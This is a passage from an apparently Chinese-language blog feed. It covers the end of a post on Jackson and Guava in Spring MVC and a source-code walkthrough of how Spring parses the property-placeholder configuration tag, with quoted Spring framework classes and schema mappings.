class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span>  <span class="attr">local</span>=<span class="string">"guavaObjectMapper"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="支持的类型"><a href="#支持的类型" class="headerlink" title="支持的类型"></a>支持的类型</h2><img src="/2016/11/16/jackson-guava/jar.png">
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://stackoverflow.com/questions/26979120/spring-mvc-configuration-jackson-guava-multimap" rel="external nofollow noopener noreferrer" target="_blank">Spring MVC configuration + Jackson + Guava multimap</a></p>
</li>
<li><p><a href="http://www.leveluplunch.com/java/examples/convert-json-to-guava-multimap-with-jackson/" rel="external nofollow noopener noreferrer" target="_blank">Json to guava multimap</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jackson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring占位符（property-placeholder），源码阅读]]></title>
      <url>http://qsli.github.io/2016/10/31/property-placeholder/</url>
      <content type="html"><![CDATA[<h2 id="lt-context-property-placeholder-location-39-xxx-39-gt-的解析过程"><a href="#lt-context-property-placeholder-location-39-xxx-39-gt-的解析过程" class="headerlink" title="&lt;context:property-placeholder location=&#39;xxx&#39; /&gt;的解析过程"></a><code>&lt;context:property-placeholder location=&#39;xxx&#39; /&gt;</code>的解析过程</h2><h3 id="schema"><a href="#schema" class="headerlink" title="schema"></a>schema</h3><p>在idea中<code>ctrl</code> + <code>b</code>或者，<code>ctrl</code> + 鼠标左键点击即可打开schema具体的位置</p>
<img src="/2016/10/31/property-placeholder/location.jpg">
<p><code>sping.handlers</code>中内容如下:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context=org.springframework.context.config.ContextNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/jee=org.springframework.ejb.config.JeeNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/lang=org.springframework.scripting.config.LangNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/task=org.springframework.scheduling.config.TaskNamespaceHandler</span><br><span class="line">http\://www.springframework.org/schema/cache=org.springframework.cache.config.CacheNamespaceHandler</span><br></pre></td></tr></table></figure>
<p><code>spring.schemas</code>中的内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http\://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.0.xsd=org/springframework/context/config/spring-context-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.1.xsd=org/springframework/context/config/spring-context-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context-4.2.xsd=org/springframework/context/config/spring-context-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-2.0.xsd=org/springframework/ejb/config/spring-jee-2.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-2.5.xsd=org/springframework/ejb/config/spring-jee-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.0.xsd=org/springframework/ejb/config/spring-jee-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.1.xsd=org/springframework/ejb/config/spring-jee-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-3.2.xsd=org/springframework/ejb/config/spring-jee-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.0.xsd=org/springframework/ejb/config/spring-jee-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.1.xsd=org/springframework/ejb/config/spring-jee-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee-4.2.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/jee/spring-jee.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-2.0.xsd=org/springframework/scripting/config/spring-lang-2.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-2.5.xsd=org/springframework/scripting/config/spring-lang-2.5.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.0.xsd=org/springframework/scripting/config/spring-lang-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.1.xsd=org/springframework/scripting/config/spring-lang-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-3.2.xsd=org/springframework/scripting/config/spring-lang-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.0.xsd=org/springframework/scripting/config/spring-lang-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.1.xsd=org/springframework/scripting/config/spring-lang-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang-4.2.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/lang/spring-lang.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.0.xsd=org/springframework/scheduling/config/spring-task-3.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.1.xsd=org/springframework/scheduling/config/spring-task-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-3.2.xsd=org/springframework/scheduling/config/spring-task-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.0.xsd=org/springframework/scheduling/config/spring-task-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.1.xsd=org/springframework/scheduling/config/spring-task-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task-4.2.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/task/spring-task.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-3.1.xsd=org/springframework/cache/config/spring-cache-3.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-3.2.xsd=org/springframework/cache/config/spring-cache-3.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.0.xsd=org/springframework/cache/config/spring-cache-4.0.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.1.xsd=org/springframework/cache/config/spring-cache-4.1.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache-4.2.xsd=org/springframework/cache/config/spring-cache-4.2.xsd</span><br><span class="line">http\://www.springframework.org/schema/cache/spring-cache.xsd=org/springframework/cache/config/spring-cache-4.2.xsd</span><br></pre></td></tr></table></figure>
<h3 id="NamespaceHandlerSupport"><a href="#NamespaceHandlerSupport" class="headerlink" title="NamespaceHandlerSupport"></a>NamespaceHandlerSupport</h3><p>从<code>handler</code>中我们可以找出<code>context</code>标签的处理类是<code>org.springframework.context.config.ContextNamespaceHandler</code>,内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContextNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"property-placeholder"</span>, <span class="keyword">new</span> PropertyPlaceholderBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"property-override"</span>, <span class="keyword">new</span> PropertyOverrideBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"annotation-config"</span>, <span class="keyword">new</span> AnnotationConfigBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"component-scan"</span>, <span class="keyword">new</span> ComponentScanBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"load-time-weaver"</span>, <span class="keyword">new</span> LoadTimeWeaverBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"spring-configured"</span>, <span class="keyword">new</span> SpringConfiguredBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"mbean-export"</span>, <span class="keyword">new</span> MBeanExportBeanDefinitionParser());</span><br><span class="line">		registerBeanDefinitionParser(<span class="string">"mbean-server"</span>, <span class="keyword">new</span> MBeanServerBeanDefinitionParser());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺藤摸瓜就能找到<code>property-placeholder</code>的处理类是<code>PropertyPlaceholderBeanDefinitionParser</code></p>
<h3 id="PropertyPlaceholderBeanDefinitionParser"><a href="#PropertyPlaceholderBeanDefinitionParser" class="headerlink" title="PropertyPlaceholderBeanDefinitionParser"></a>PropertyPlaceholderBeanDefinitionParser</h3><p>继承关系：</p>
<img src="/2016/10/31/property-placeholder/hierarchy.jpg">
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertyPlaceholderBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractPropertyLoadingBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SYSTEM_PROPERTIES_MODE_ATTRIBUTE = <span class="string">"system-properties-mode"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SYSTEM_PROPERTIES_MODE_DEFAULT = <span class="string">"ENVIRONMENT"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt; getBeanClass(Element element) &#123;</span><br><span class="line">		<span class="comment">// As of Spring 3.1, the default value of system-properties-mode has changed from</span></span><br><span class="line">		<span class="comment">// 'FALLBACK' to 'ENVIRONMENT'. This latter value indicates that resolution of</span></span><br><span class="line">		<span class="comment">// placeholders against system properties is a function of the Environment and</span></span><br><span class="line">		<span class="comment">// its current set of PropertySources.</span></span><br><span class="line">		<span class="keyword">if</span> (SYSTEM_PROPERTIES_MODE_DEFAULT.equals(element.getAttribute(SYSTEM_PROPERTIES_MODE_ATTRIBUTE))) &#123;</span><br><span class="line">			<span class="keyword">return</span> PropertySourcesPlaceholderConfigurer<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// The user has explicitly specified a value for system-properties-mode: revert to</span></span><br><span class="line">		<span class="comment">// PropertyPlaceholderConfigurer to ensure backward compatibility with 3.0 and earlier.</span></span><br><span class="line">		<span class="keyword">return</span> PropertyPlaceholderConfigurer<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder builder)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.doParse(element, builder);</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"ignoreUnresolvablePlaceholders"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"ignore-unresolvable"</span>)));</span><br><span class="line"></span><br><span class="line">		String systemPropertiesModeName = element.getAttribute(SYSTEM_PROPERTIES_MODE_ATTRIBUTE);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(systemPropertiesModeName) &amp;&amp;</span><br><span class="line">				!systemPropertiesModeName.equals(SYSTEM_PROPERTIES_MODE_DEFAULT)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"systemPropertiesModeName"</span>, <span class="string">"SYSTEM_PROPERTIES_MODE_"</span> + systemPropertiesModeName);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (element.hasAttribute(<span class="string">"value-separator"</span>)) &#123;    </span><br><span class="line">			builder.addPropertyValue(<span class="string">"valueSeparator"</span>, element.getAttribute(<span class="string">"value-separator"</span>));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (element.hasAttribute(<span class="string">"null-value"</span>)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"nullValue"</span>, element.getAttribute(<span class="string">"null-value"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>getBeanClass</code>中，根据标签中的<code>system-properties-mode</code>属性来返回不同的类，来指明要实例化的类。</p>
<p>再来看上述的<code>parse</code>方法，首先就是调用父类的<code>doParse</code>方法，然后就是解析标签中的相应属性，放到<code>BeanDefinitionBuilder</code>中，剩下的工作就交给spring这个框架来完成了。</p>
<h4 id="system-properties-mode"><a href="#system-properties-mode" class="headerlink" title="system-properties-mode"></a><code>system-properties-mode</code></h4><p>决定解析placeholder的顺序。这个属性的取值如下：</p>
<blockquote>
<p>   <strong>“ENVIRONMENT”</strong> indicates placeholders should be resolved against the current Environment and against any local properties;</p>
</blockquote>
<blockquote>
<p>   <strong>“NEVER”</strong> indicates placeholders should be resolved only against local properties and never against system properties;</p>
</blockquote>
<blockquote>
<p>   <strong>“FALLBACK”</strong> indicates placeholders should be resolved against any local properties and then against system properties;</p>
</blockquote>
<blockquote>
<p>   <strong>“OVERRIDE”</strong> indicates placeholders should be resolved first against system properties and then against any local properties;</p>
</blockquote>
<p>这个属性的默认值是<code>ENVIRONMENT</code>,也就是先从环境变量中解析，然后才从我们定义的properties文件中解析，如果环境中的变量名和配置文件中的变量名冲突，</p>
<p>就会使用环境变量中的。</p>
<blockquote>
<p>所以配置文件中的变量名最好带一个前缀，如<code>jdbc.username=</code>, 笔者在Ubuntu下就遇到过不带前缀的<code>username</code>和系统的’username’冲突的情况</p>
</blockquote>
<h4 id="ignore-unresolvable"><a href="#ignore-unresolvable" class="headerlink" title="ignore-unresolvable"></a><code>ignore-unresolvable</code></h4><blockquote>
<p>   Specifies if failure to find the property value to replace a key should be ignored.<br>    Default is “false”, meaning that this placeholder configurer will raise an exception<br>    if it cannot resolve a key. Set to “true” to allow the configurer to pass on the key<br>    to any others in the context that have not yet visited the key in question.</p>
</blockquote>
<p>这个属性很关键，他决定遇到无法解析的变量时是否抛出异常，默认是<code>fale</code>（抛出异常）,在有多个配置文件的时候应该设置为<code>true</code>。</p>
<h4 id="value-separator"><a href="#value-separator" class="headerlink" title="value-separator"></a><code>value-separator</code></h4><p>placeHolder默认值得分隔符，默认是<code>:</code></p>
<blockquote>
<p>The separating character between the placeholder variable and the associated     default value: by default, a ‘:’ symbol.</p>
</blockquote>
<h4 id="null-value"><a href="#null-value" class="headerlink" title="null-value"></a><code>null-value</code></h4><blockquote>
<p>   A value that should be treated as ‘null’ when resolved as a placeholder value:<br>    e.g. “” (empty String) or “null”. By default, no such null value is defined.</p>
</blockquote>
<p><strong>这些属性都可以在相应的<code>xsd</code>schema中找到。</strong></p>
<h3 id="AbstractPropertyLoadingBeanDefinitionParser"><a href="#AbstractPropertyLoadingBeanDefinitionParser" class="headerlink" title="AbstractPropertyLoadingBeanDefinitionParser"></a>AbstractPropertyLoadingBeanDefinitionParser</h3><p>这是上面的那个解析类的父类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractPropertyLoadingBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractSingleBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">shouldGenerateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder builder)</span> </span>&#123;</span><br><span class="line">		String location = element.getAttribute(<span class="string">"location"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(location)) &#123;</span><br><span class="line">			String[] locations = StringUtils.commaDelimitedListToStringArray(location);</span><br><span class="line">			builder.addPropertyValue(<span class="string">"locations"</span>, locations);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String propertiesRef = element.getAttribute(<span class="string">"properties-ref"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(propertiesRef)) &#123;</span><br><span class="line">			builder.addPropertyReference(<span class="string">"properties"</span>, propertiesRef);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String fileEncoding = element.getAttribute(<span class="string">"file-encoding"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(fileEncoding)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"fileEncoding"</span>, fileEncoding);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		String order = element.getAttribute(<span class="string">"order"</span>);</span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(order)) &#123;</span><br><span class="line">			builder.addPropertyValue(<span class="string">"order"</span>, Integer.valueOf(order));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"ignoreResourceNotFound"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"ignore-resource-not-found"</span>)));</span><br><span class="line"></span><br><span class="line">		builder.addPropertyValue(<span class="string">"localOverride"</span>,</span><br><span class="line">				Boolean.valueOf(element.getAttribute(<span class="string">"local-override"</span>)));</span><br><span class="line"></span><br><span class="line">		builder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="shouldGenerateId"><a href="#shouldGenerateId" class="headerlink" title="shouldGenerateId"></a>shouldGenerateId</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Should an ID be generated instead of read from the passed in &#123;<span class="doctag">@link</span> Element&#125;?</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Disabled by default; subclasses can override this to enable ID generation.</span></span><br><span class="line"><span class="comment"> * Note that this flag is about &lt;i&gt;always&lt;/i&gt; generating an ID; the parser</span></span><br><span class="line"><span class="comment"> * won't even check for an "id" attribute in this case.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> whether the parser should always generate an id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">shouldGenerateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="doParse"><a href="#doParse" class="headerlink" title="doParse"></a>doParse</h4><p>这个方法负责解析配置文件的location、file-encoding等通用的属性，并放置到<code>builder</code>中。</p>
<h2 id="Spring-调用handler的过程"><a href="#Spring-调用handler的过程" class="headerlink" title="Spring 调用handler的过程"></a>Spring 调用handler的过程</h2><p>spring将特定的标签的解析委托给我们自己定义的handler的过程主要是在<code>DefaultBeanDefinitionDocumentReader</code>中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Parse the elements at the root level in the document:</span></span><br><span class="line"><span class="comment">	 * "import", "alias", "bean".</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> root the DOM root element of the document</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line">			NodeList nl = root.getChildNodes();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line">				Node node = nl.item(i);</span><br><span class="line">				<span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">					Element ele = (Element) node;</span><br><span class="line">					<span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line">						parseDefaultElement(ele, delegate);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						delegate.parseCustomElement(ele);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			delegate.parseCustomElement(root);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>context</code>不是默认命名空间的标签，所以走<code>parseCustomElement</code>分支。</p>
<p>走到<code>BeanDefinitionParserDelegate</code>的<code>parseCustomElement</code>方法中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parseCustomElement</span><span class="params">(Element ele)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> parseCustomElement(ele, <span class="keyword">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parseCustomElement</span><span class="params">(Element ele, BeanDefinition containingBd)</span> </span>&#123;</span><br><span class="line">		String namespaceUri = getNamespaceURI(ele);</span><br><span class="line">		NamespaceHandler handler = <span class="keyword">this</span>.readerContext.getNamespaceHandlerResolver().resolve(namespaceUri);</span><br><span class="line">		<span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;</span><br><span class="line">			error(<span class="string">"Unable to locate Spring NamespaceHandler for XML schema namespace ["</span> + namespaceUri + <span class="string">"]"</span>, ele);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> handler.parse(ele, <span class="keyword">new</span> ParserContext(<span class="keyword">this</span>.readerContext, <span class="keyword">this</span>, containingBd));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里从<code>NamespaceHandlerResolver</code>中根据<code>namespaceUri</code>获取到对应的<code>NamespaceHandler</code>,然后调用<code>handler</code>的<code>parse</code><br>方法进行解析，返回一个<code>BeanDefinition</code>，然后就注册到spring中了。</p>
<p>这里的handler就是前面我们看到的实现了<code>NamespaceHandlerSupport</code>的那个<code>ContextNamespaceHandler</code>,<code>NamespaceHandlerSupport</code>继承自<code>NamespaceHandler</code>,它的parse 方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Parses the supplied &#123;<span class="doctag">@link</span> Element&#125; by delegating to the &#123;<span class="doctag">@link</span> BeanDefinitionParser&#125; that is</span></span><br><span class="line"><span class="comment">	 * registered for that &#123;<span class="doctag">@link</span> Element&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span 